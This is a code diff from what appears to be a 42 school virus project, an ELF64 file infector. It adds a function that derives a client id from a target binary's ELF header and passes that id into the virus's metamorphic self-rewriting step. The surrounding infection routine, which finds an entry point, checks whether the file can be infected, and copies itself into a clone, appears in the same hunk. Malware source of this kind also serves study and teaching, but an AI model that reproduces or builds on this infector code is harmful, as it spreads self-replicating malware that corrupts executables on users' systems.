@@ -6,7 +6,7 @@
 /*   By: agrumbac <agrumbac@student.42.fr>          +#+  +:+       +#+        */
 /*                                                +#+#+#+#+#+   +#+           */
 /*   Created: 2019/03/11 15:42:04 by agrumbac          #+#    #+#             */
-/*   Updated: 2019/12/19 00:59:29 by anselme          ###   ########.fr       */
+/*   Updated: 2019/12/20 22:24:20 by anselme          ###   ########.fr       */
 /*                                                                            */
 /* ************************************************************************** */
 
@@ -80,17 +80,28 @@ static bool	define_shift_amount(const struct entry *original_entry, size_t *shif
 	return true;
 }
 
+bool		get_client_id(uint64_t *client_id, const struct safe_pointer info)
+{
+	Elf64_Ehdr	*elf_hdr = safe(0, sizeof(Elf64_Ehdr));
+	if (elf_hdr == NULL)
+		return errors(ERR_FILE, _ERR_CANT_READ_ELFHDR);
+	*client_id = checksum((void *)elf_hdr, sizeof(Elf64_Ehdr));
+	return true;
+}
+
 bool		elf64_packer(const struct famine food, size_t original_file_size, uint64_t seed[2])
 {
 	struct entry	original_entry;
 	struct entry	clone_entry;
 	size_t		shift_amount;
 	uint64_t	son_seed[2];
+	uint64_t	client_id;
 
 	if (!find_entry(&original_entry, food.original_safe)
 	|| !can_infect(&original_entry, food.original_safe)
 	|| !define_shift_amount(&original_entry, &shift_amount)
-	|| !metamorph_self(seed, son_seed)
+	|| !get_client_id(&client_id, food.original_safe)
+	|| !metamorph_self(seed, son_seed, client_id)
 	|| !copy_to_clone(food, original_entry.end_of_last_section, shift_amount, original_file_size)
 	|| !adjust_references(food.clone_safe , shift_amount, &original_entry)
 	|| !find_entry(&clone_entry, food.clone_safe)
